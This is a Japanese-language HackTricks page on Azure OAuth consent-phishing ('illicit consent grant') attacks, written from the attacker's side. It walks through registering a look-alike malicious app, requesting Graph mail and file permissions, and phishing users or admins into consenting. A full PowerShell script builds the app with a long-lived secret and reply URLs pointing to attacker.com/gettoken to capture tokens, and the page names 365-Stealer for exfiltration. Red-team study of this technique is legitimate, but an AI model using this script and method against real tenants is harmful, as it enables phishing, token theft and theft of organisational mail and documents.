# Az - 不正な同意付与

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする
* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください**

</details>

## OAuthアプリのフィッシング

**Azureアプリケーション**は、**ユーザーデータ**（基本情報だけでなく、ドキュメントへのアクセス、メールの送信など）へのアクセス許可を要求します。\
**許可された**場合、通常のユーザーは**「低影響の権限」**にのみ同意できます。**それ以外の**場合は、**管理者の同意が必要**です。\
`GA`、`ApplicationAdministrator`、`CloudApplication` `Administrator`、および`アプリケーションにアクセス許可を付与する権限`を含むカスタムロールは、テナント全体の同意を提供できます。

管理者の同意が不要な権限のみが**低影響**として分類されます。これらは、**基本的なサインインに必要な権限**であるopenid、profile、email、User.Read、offline\_accessです。**組織**が**すべてのアプリ**にユーザー同意を許可している場合、従業員はアプリに**自分のプロフィールから上記を読む権限を付与**できます。

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

したがって、攻撃者は**悪意のあるアプリ**を準備し、**フィッシング**を行い、ユーザーに**アプリを受け入れさせてデータを盗む**ことができます。

### 2種類の不正な同意付与攻撃

* **非認証**: 外部アカウントから`User.Read`および`User.ReadBasic.All`の権限を持つアプリケーションを作成し、ユーザーをフィッシングすると、ディレクトリ情報にアクセスできます。
* これには、フィッシングされたユーザーが外部環境からのOAuthアプリを受け入れる能力が必要です！
* **認証済み**: 十分な権限を持つ主体を侵害した場合、アカウント内でアプリケーションを作成し、特権のあるOAuth権限を受け入れることができる特権のあるユーザーをフィッシングします。
* この場合、すでにディレクトリの情報にアクセスできるため、権限`User.ReadBasic.All`はもはや興味深くありません。
* **管理者に権限を付与する権限が必要な権限**に興味がある可能性が高いです。なぜなら、生のユーザーはOAuthアプリに権限を付与できないためです。そのため、**これらのユーザーだけをフィッシングする必要があります**（後でどの役割/権限がこの特権を付与するかについて詳しく説明します）

### ユーザーが同意できるかどうかを確認する

Azure Active Directory（Azure AD）のユーザーがアプリケーションに同意できるかどうかに関する同意構成を確認するために、次のPowerShellコマンドが使用されます:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **ユーザー同意の無効化**: この設定は、ユーザーがアプリケーションに対して権限を付与することを禁止します。ユーザーによるアプリケーションへの同意は許可されません。
* **検証済みのパブリッシャーまたは組織からのアプリに対するユーザー同意を許可しますが、選択した権限のみ**: この設定では、すべてのユーザーが、検証済みのパブリッシャーによって公開されたアプリケーションおよび自分のテナントに登録されたアプリケーションにのみ同意できるようにします。特定の権限に対してのみ同意を許可することで、コントロールのレイヤーを追加します。
* **すべてのアプリに同意できる**: この設定はより寛容であり、すべてのユーザーが、管理者の同意が必要とされない限り、アプリケーションの任意の権限に同意できるようにします。
* **カスタムアプリ同意ポリシー**: この設定は、特定の組織の要件に合わせて調整できるカスタムポリシーが導入されていることを示し、アプリのパブリッシャーやアプリが要求する権限などに基づいた制限の組み合わせを含む場合があります。

## **不正な同意付与攻撃の理解**

不正な同意付与攻撃では、攻撃者がエンドユーザーをだまして、Azureに登録された悪意のあるアプリケーションに権限を付与させます。これは、アプリケーションを正当なものと見せかけ、被害者が無意識に「承諾」ボタンをクリックさせることで行われます。その結果、Azure ADは攻撃者のサイトにトークンを発行し、組織アカウントを必要とせずに攻撃者が被害者のデータにアクセスして操作することを可能にします。例えば、メールの読み取りや送信、ファイルへのアクセスなどが挙げられます。

## **攻撃フローの概要**

この攻撃は、一般的な企業を標的としていくつかのステップを経て展開されます。以下は、攻撃が展開される可能性のある方法です：

1. **ドメイン登録とアプリケーションホスティング**: 攻撃者は、信頼できるサイトに似せたドメインを登録します。例えば、「safedomainlogin.com」というドメインの下に、悪意のあるアプリケーションをホストするためのサブドメイン（例：「companyname.safedomainlogin.com」）が作成されます。
2. **Azure ADでのアプリケーション登録**: 次に、攻撃者はAzure ADテナントでマルチテナントアプリケーションを登録し、それを標的企業の名前にして正当に見せかけます。アプリケーションのリダイレクトURLを、悪意のあるアプリケーションをホストするサブドメインを指すように構成します。
3. **権限の設定**: 攻撃者は、さまざまなAPI権限（例：`Mail.Read`、`Notes.Read.All`、`Files.ReadWrite.All`、`User.ReadBasic.All`、`User.Read`）を持つアプリケーションを設定します。これらの権限は、ユーザーによって付与されると、攻撃者がユーザーの代わりに機密情報を抽出できるようにします。
4. **悪意のあるリンクの配布**: 攻撃者は、悪意のあるアプリケーションのクライアントIDを含むリンクを作成し、対象ユーザーに共有して同意を取得するように仕向けます。

## **攻撃に利用するツール**

この攻撃は、[**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)などのツールを使用して容易に行うことができます。

### 攻撃前の準備：

攻撃者が被害組織のユーザーにある程度のアクセス権を持っている場合、組織のポリシーがユーザーがアプリを受け入れることを許可しているかどうかを確認するかもしれません。
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
攻撃を実行するために、攻撃者はAzureテナント内の**App registrations**で**新しいApp**を作成する必要があります。このAppは以下の権限で構成されています：

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`は`Delegated permissions`内の`Microsoft Graph`にあります（Application permissionsは常に追加の承認が必要です）。

- `User.ReadBasic.All`は、付与された場合に組織内の**すべてのユーザーの情報を読み取る**ことを許可する権限です。
- `GA`、`ApplicationAdministrator`、`CloudApplication Administrator`、および`アプリケーションに権限を付与する権限を含むカスタムロール`のみがテナント全体の同意を提供できます。したがって、**管理者同意が必要なApp**を承認するよう求めるには、これらの役割のいずれかを持つユーザーを**フィッシング**する必要があります。

また、CLIを使用してAppを作成することもできます：

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) をチェックして、それを設定する方法を学びます。

{% hint style="warning" %}
取得される **アクセストークン** は、`User.Read` と `User.ReadBasic.All`（要求された権限）のスコープを持つ **graphエンドポイント** 用です。他のアクションを実行することはできません（しかし、これらは組織内のすべてのユーザーに関する情報を **ダウンロードするのに十分です**）。
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

このツールを使用してこの攻撃を実行することもできます。

## ポストエクスプロイテーション

ユーザーにアクセスできると、機密文書の盗みや、バックドア付きの文書ファイルをアップロードするなどのことができます。

## 参考文献

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローする。
* **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する。

</details>
